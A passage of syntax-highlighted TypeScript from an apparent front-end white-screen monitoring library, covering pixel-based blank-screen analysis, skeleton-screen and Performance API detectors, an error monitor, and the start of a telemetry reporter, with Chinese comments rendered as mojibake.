  <span class="hljs-keyword">private</span> <span class="hljs-title function_">analyzeImage</span>(): <span class="hljs-title class_">ScreenshotResult</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">whitePixelRatio</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">totalPixels</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">whitePixels</span>: <span class="hljs-number">0</span>
      };
    }
    
    <span class="hljs-keyword">const</span> { sampleWidth, sampleHeight, brightnessThreshold } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> imageData = <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">getImageData</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sampleWidth, sampleHeight);
    <span class="hljs-keyword">const</span> data = imageData.<span class="hljs-property">data</span>;
    
    <span class="hljs-keyword">let</span> whitePixels = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> blackPixels = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> grayPixels = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> coloredPixels = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> totalPixels = (sampleWidth * sampleHeight);
    
    <span class="hljs-comment">// éå†åƒç´ </span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i += <span class="hljs-number">4</span>) {
      <span class="hljs-keyword">const</span> r = data[i];
      <span class="hljs-keyword">const</span> g = data[i + <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> b = data[i + <span class="hljs-number">2</span>];
      
      <span class="hljs-comment">// è®¡ç®—äº®åº¦</span>
      <span class="hljs-keyword">const</span> brightness = (r + g + b) / <span class="hljs-number">3</span>;
      
      <span class="hljs-comment">// åˆ¤æ–­åƒç´ é¢œè‰²ç±»å‹</span>
      <span class="hljs-keyword">if</span> (brightness &gt;= brightnessThreshold) {
        whitePixels++;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (brightness &lt;= <span class="hljs-number">10</span>) {
        blackPixels++;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(r - g) &lt;= <span class="hljs-number">20</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(g - b) &lt;= <span class="hljs-number">20</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(r - b) &lt;= <span class="hljs-number">20</span>) {
        grayPixels++;
      } <span class="hljs-keyword">else</span> {
        coloredPixels++;
      }
    }
    
    <span class="hljs-keyword">const</span> whitePixelRatio = whitePixels / totalPixels;
    <span class="hljs-keyword">const</span> isWhiteScreen = whitePixelRatio &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">whiteThreshold</span>;
    
    <span class="hljs-keyword">return</span> {
      isWhiteScreen,
      whitePixelRatio,
      totalPixels,
      whitePixels,
      <span class="hljs-attr">colorDistribution</span>: {
        <span class="hljs-attr">white</span>: whitePixels / totalPixels,
        <span class="hljs-attr">black</span>: blackPixels / totalPixels,
        <span class="hljs-attr">gray</span>: grayPixels / totalPixels,
        <span class="hljs-attr">colored</span>: coloredPixels / totalPixels
      }
    };
  }
  
  <span class="hljs-comment">/**
   * é‡Šæ”¾èµ„æº
   */</span>
  <span class="hljs-title function_">dispose</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = <span class="hljs-literal">null</span>;
  }
}

<span class="hljs-comment">// ==================== éª¨æ¶å±æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * éª¨æ¶å±æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SkeletonDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: {
    <span class="hljs-attr">skeletonSelector</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">timeout</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">checkInterval</span>: <span class="hljs-built_in">number</span>;
  };
  
  <span class="hljs-keyword">private</span> <span class="hljs-attr">intervalId</span>: <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setInterval</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">skeletonSelector</span>: config.<span class="hljs-property">skeletonSelector</span> ?? <span class="hljs-string">'.skeleton, [data-skeleton], .loading-skeleton'</span>,
      <span class="hljs-attr">timeout</span>: config.<span class="hljs-property">timeout</span> ?? <span class="hljs-number">10000</span>,
      <span class="hljs-attr">checkInterval</span>: <span class="hljs-number">500</span>
    };
  }
  
  <span class="hljs-comment">/**
   * æ£€æµ‹éª¨æ¶å±çŠ¶æ€
   */</span>
  <span class="hljs-title function_">detect</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">SkeletonResult</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      
      <span class="hljs-comment">// é¦–å…ˆæ£€æŸ¥éª¨æ¶å±æ˜¯å¦å­˜åœ¨</span>
      <span class="hljs-keyword">const</span> skeletonExists = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isSkeletonPresent</span>();
      
      <span class="hljs-keyword">if</span> (!skeletonExists) {
        <span class="hljs-comment">// éª¨æ¶å±ä¸å­˜åœ¨ï¼Œå¯èƒ½å·²ç»åŠ è½½å®Œæˆæˆ–æ ¹æœ¬æ²¡æœ‰éª¨æ¶å±</span>
        <span class="hljs-title function_">resolve</span>({
          <span class="hljs-attr">skeletonExists</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">skeletonRemoved</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">detectionTime</span>: <span class="hljs-number">0</span>
        });
        <span class="hljs-keyword">return</span>;
      }
      
      <span class="hljs-comment">// å¼€å§‹å®šæœŸæ£€æŸ¥éª¨æ¶å±æ˜¯å¦æ¶ˆå¤±</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">intervalId</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> elapsed = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span>;
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isSkeletonPresent</span>()) {
          <span class="hljs-comment">// éª¨æ¶å±å·²æ¶ˆå¤±</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stop</span>();
          <span class="hljs-title function_">resolve</span>({
            <span class="hljs-attr">skeletonExists</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">skeletonRemoved</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">detectionTime</span>: elapsed
          });
          <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-keyword">if</span> (elapsed &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">timeout</span>) {
          <span class="hljs-comment">// è¶…æ—¶ï¼Œéª¨æ¶å±ä»ç„¶å­˜åœ¨</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stop</span>();
          <span class="hljs-title function_">resolve</span>({
            <span class="hljs-attr">skeletonExists</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">skeletonRemoved</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">detectionTime</span>: elapsed
          });
        }
      }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">checkInterval</span>);
    });
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥éª¨æ¶å±æ˜¯å¦å­˜åœ¨
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">isSkeletonPresent</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> { skeletonSelector } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> selectors = skeletonSelector.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> s.<span class="hljs-title function_">trim</span>());
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> selector <span class="hljs-keyword">of</span> selectors) {
        <span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> element <span class="hljs-keyword">of</span> elements) {
          <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementVisible</span>(element)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
          }
        }
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-comment">/**
   * åœæ­¢æ£€æµ‹
   */</span>
  <span class="hljs-title function_">stop</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">intervalId</span>) {
      <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">intervalId</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">intervalId</span> = <span class="hljs-literal">null</span>;
    }
  }
  
  <span class="hljs-comment">/**
   * è·å–æ‰€æœ‰éª¨æ¶å±å…ƒç´ 
   */</span>
  <span class="hljs-title function_">getSkeletonElements</span>(): <span class="hljs-title class_">Element</span>[] {
    <span class="hljs-keyword">const</span> { skeletonSelector } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-attr">elements</span>: <span class="hljs-title class_">Element</span>[] = [];
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> selectors = skeletonSelector.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> s.<span class="hljs-title function_">trim</span>());
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> selector <span class="hljs-keyword">of</span> selectors) {
        <span class="hljs-keyword">const</span> found = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector);
        elements.<span class="hljs-title function_">push</span>(...<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(found));
      }
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">// é€‰æ‹©å™¨æ— æ•ˆ</span>
    }
    
    <span class="hljs-keyword">return</span> elements;
  }
}

<span class="hljs-comment">// ==================== Performance API æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * Performance API æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: {
    <span class="hljs-attr">fcpThreshold</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">lcpThreshold</span>: <span class="hljs-built_in">number</span>;
  };
  
  <span class="hljs-keyword">private</span> <span class="hljs-attr">lcpObserver</span>: <span class="hljs-title class_">PerformanceObserver</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">lcpValue</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">fcpThreshold</span>: <span class="hljs-number">3000</span>,
      <span class="hljs-attr">lcpThreshold</span>: <span class="hljs-number">4000</span>
    };
  }
  
  <span class="hljs-comment">/**
   * åˆå§‹åŒ– LCP è§‚å¯Ÿå™¨
   */</span>
  <span class="hljs-title function_">initLCPObserver</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpObserver</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">entryList</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> entries = entryList.<span class="hljs-title function_">getEntries</span>();
        <span class="hljs-keyword">if</span> (entries.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
          <span class="hljs-keyword">const</span> lastEntry = entries[entries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceEntry</span> &amp; { <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span> };
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpValue</span> = lastEntry.<span class="hljs-property">startTime</span>;
        }
      });
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpObserver</span>.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">// LCP è§‚å¯Ÿå™¨å¯èƒ½ä¸è¢«æ”¯æŒ</span>
    }
  }
  
  <span class="hljs-comment">/**
   * è·å–æ€§èƒ½æŒ‡æ ‡
   */</span>
  <span class="hljs-title function_">getMetrics</span>(): <span class="hljs-title class_">PerformanceData</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">getPerformanceData</span>();
    
    <span class="hljs-comment">// æ·»åŠ  LCP</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpValue</span> &gt; <span class="hljs-number">0</span>) {
      data.<span class="hljs-property">largestContentfulPaint</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpValue</span>;
    }
    
    <span class="hljs-keyword">return</span> data;
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­æ˜¯å¦å¯èƒ½ç™½å±ï¼ˆåŸºäºæ€§èƒ½æŒ‡æ ‡ï¼‰
   */</span>
  <span class="hljs-title function_">isPotentialWhiteScreen</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> metrics = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMetrics</span>();
    
    <span class="hljs-comment">// å¦‚æœ FCP è¶…è¿‡é˜ˆå€¼ï¼Œå¯èƒ½æ˜¯ç™½å±</span>
    <span class="hljs-keyword">if</span> (metrics.<span class="hljs-property">firstContentfulPaint</span> &amp;&amp; metrics.<span class="hljs-property">firstContentfulPaint</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">fcpThreshold</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// å¦‚æœ LCP è¶…è¿‡é˜ˆå€¼ï¼Œå¯èƒ½æœ‰é—®é¢˜</span>
    <span class="hljs-keyword">if</span> (metrics.<span class="hljs-property">largestContentfulPaint</span> &amp;&amp; metrics.<span class="hljs-property">largestContentfulPaint</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">lcpThreshold</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">/**
   * è·å–èµ„æºåŠ è½½ç»Ÿè®¡
   */</span>
  <span class="hljs-title function_">getResourceStats</span>(): {
    <span class="hljs-attr">totalResources</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">failedResources</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">slowResources</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">resourceDetails</span>: {
      <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
      <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;
      <span class="hljs-attr">duration</span>: <span class="hljs-built_in">number</span>;
      <span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span>;
      <span class="hljs-attr">failed</span>: <span class="hljs-built_in">boolean</span>;
    }[];
  } {
    <span class="hljs-keyword">const</span> resources = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'resource'</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceResourceTiming</span>[];
    <span class="hljs-keyword">const</span> <span class="hljs-attr">resourceDetails</span>: {
      <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
      <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;
      <span class="hljs-attr">duration</span>: <span class="hljs-built_in">number</span>;
      <span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span>;
      <span class="hljs-attr">failed</span>: <span class="hljs-built_in">boolean</span>;
    }[] = [];
    
    <span class="hljs-keyword">let</span> failedResources = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> slowResources = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> resource <span class="hljs-keyword">of</span> resources) {
      <span class="hljs-keyword">const</span> failed = resource.<span class="hljs-property">transferSize</span> === <span class="hljs-number">0</span> &amp;&amp; resource.<span class="hljs-property">decodedBodySize</span> === <span class="hljs-number">0</span>;
      <span class="hljs-keyword">const</span> slow = resource.<span class="hljs-property">duration</span> &gt; <span class="hljs-number">2000</span>;
      
      <span class="hljs-keyword">if</span> (failed) failedResources++;
      <span class="hljs-keyword">if</span> (slow) slowResources++;
      
      resourceDetails.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: resource.<span class="hljs-property">name</span>,
        <span class="hljs-attr">type</span>: resource.<span class="hljs-property">initiatorType</span>,
        <span class="hljs-attr">duration</span>: resource.<span class="hljs-property">duration</span>,
        <span class="hljs-attr">size</span>: resource.<span class="hljs-property">transferSize</span> || <span class="hljs-number">0</span>,
        failed
      });
    }
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">totalResources</span>: resources.<span class="hljs-property">length</span>,
      failedResources,
      slowResources,
      resourceDetails
    };
  }
  
  <span class="hljs-comment">/**
   * åœæ­¢è§‚å¯Ÿ
   */</span>
  <span class="hljs-title function_">stop</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpObserver</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpObserver</span>.<span class="hljs-title function_">disconnect</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">lcpObserver</span> = <span class="hljs-literal">null</span>;
    }
  }
}

<span class="hljs-comment">// ==================== é”™è¯¯ç›‘å¬å™¨ ====================</span>

<span class="hljs-comment">/**
 * é”™è¯¯ç›‘å¬å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorMonitor</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">errors</span>: <span class="hljs-title class_">ErrorInfo</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-attr">maxErrors</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">50</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listeners</span>: {
    <span class="hljs-attr">error</span>: <span class="hljs-function">(<span class="hljs-params">event: ErrorEvent</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
    <span class="hljs-attr">unhandledrejection</span>: <span class="hljs-function">(<span class="hljs-params">event: PromiseRejectionEvent</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  };
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span> = {
      <span class="hljs-attr">error</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleError</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
      <span class="hljs-attr">unhandledrejection</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleUnhandledRejection</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)
    };
  }
  
  <span class="hljs-comment">/**
   * å¼€å§‹ç›‘å¬
   */</span>
  <span class="hljs-title function_">start</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-property">error</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-property">unhandledrejection</span>);
  }
  
  <span class="hljs-comment">/**
   * åœæ­¢ç›‘å¬
   */</span>
  <span class="hljs-title function_">stop</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-property">error</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-property">unhandledrejection</span>);
  }
  
  <span class="hljs-comment">/**
   * å¤„ç†é”™è¯¯äº‹ä»¶
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">handleError</span>(<span class="hljs-attr">event</span>: <span class="hljs-title class_">ErrorEvent</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxErrors</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">message</span>: event.<span class="hljs-property">message</span> || <span class="hljs-string">'Unknown error'</span>,
      <span class="hljs-attr">stack</span>: event.<span class="hljs-property">error</span>?.<span class="hljs-property">stack</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">'error'</span>
    });
  }
  
  <span class="hljs-comment">/**
   * å¤„ç†æœªå¤„ç†çš„ Promise æ‹’ç»
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">handleUnhandledRejection</span>(<span class="hljs-attr">event</span>: <span class="hljs-title class_">PromiseRejectionEvent</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxErrors</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">let</span> message = <span class="hljs-string">'Unhandled Promise rejection'</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">stack</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>;
    
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">reason</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span>) {
      message = event.<span class="hljs-property">reason</span>.<span class="hljs-property">message</span>;
      stack = event.<span class="hljs-property">reason</span>.<span class="hljs-property">stack</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> event.<span class="hljs-property">reason</span> === <span class="hljs-string">'string'</span>) {
      message = event.<span class="hljs-property">reason</span>;
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>.<span class="hljs-title function_">push</span>({
      message,
      stack,
      <span class="hljs-attr">type</span>: <span class="hljs-string">'unhandledrejection'</span>
    });
  }
  
  <span class="hljs-comment">/**
   * è·å–æ‰€æœ‰é”™è¯¯
   */</span>
  <span class="hljs-title function_">getErrors</span>(): <span class="hljs-title class_">ErrorInfo</span>[] {
    <span class="hljs-keyword">return</span> [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>];
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­æ˜¯å¦æœ‰å…³é”®é”™è¯¯
   */</span>
  <span class="hljs-title function_">hasCriticalErrors</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¯èƒ½å¯¼è‡´ç™½å±çš„é”™è¯¯</span>
    <span class="hljs-keyword">const</span> criticalPatterns = [
      <span class="hljs-regexp">/chunk.*failed/i</span>,
      <span class="hljs-regexp">/loading.*chunk/i</span>,
      <span class="hljs-regexp">/script.*error/i</span>,
      <span class="hljs-regexp">/syntaxerror/i</span>,
      <span class="hljs-regexp">/referenceerror/i</span>,
      <span class="hljs-regexp">/cannot read/i</span>,
      <span class="hljs-regexp">/is not defined/i</span>,
      <span class="hljs-regexp">/unexpected token/i</span>
    ];
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> error <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> pattern <span class="hljs-keyword">of</span> criticalPatterns) {
        <span class="hljs-keyword">if</span> (pattern.<span class="hljs-title function_">test</span>(error.<span class="hljs-property">message</span>)) {
          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
      }
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">/**
   * æ¸…é™¤é”™è¯¯
   */</span>
  <span class="hljs-title function_">clear</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span> = [];
  }
}

<span class="hljs-comment">// ==================== æ•°æ®ä¸ŠæŠ¥å™¨ ====================</span>

<span class="hljs-comment">/**
 * æ•°æ®ä¸ŠæŠ¥å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Reporter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: {
    endpoint?: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">enableConsole</span>: <span class="hljs-built_in">boolean</span>;
    <span class="hljs-attr">enableBeacon</span>: <span class="hljs-built_in">boolean</span>;
    <span class="hljs-attr">sampleRate</span>: <span class="hljs-built_in">number</span>;
    customHeaders?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;;
  };
  
  <span class="hljs-keyword">private</span> <span class="hljs-attr">queue</span>: <span class="hljs-title class_">WhiteScreenReport</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-attr">maxQueueSize</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isFlushing</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: {
    endpoint?: <span class="hljs-built_in">string</span>;
    enableConsole?: <span class="hljs-built_in">boolean</span>;
    enableBeacon?: <span class="hljs-built_in">boolean</span>;
    sampleRate?: <span class="hljs-built_in">number</span>;
    customHeaders?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;;
  } = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">endpoint</span>: config.<span class="hljs-property">endpoint</span>,
      <span class="hljs-attr">enableConsole</span>: config.<span class="hljs-property">enableConsole</span> ?? <span class="hljs-literal">true</span>,
      <span class="hljs-attr">enableBeacon</span>: config.<span class="hljs-property">enableBeacon</span> ?? <span class="hljs-literal">true</span>,
      <span class="hljs-attr">sampleRate</span>: config.<span class="hljs-property">sampleRate</span> ?? <span class="hljs-number">1</span>,
      <span class="hljs-attr">customHeaders</span>: config.<span class="hljs-property">customHeaders</span>
    };
    
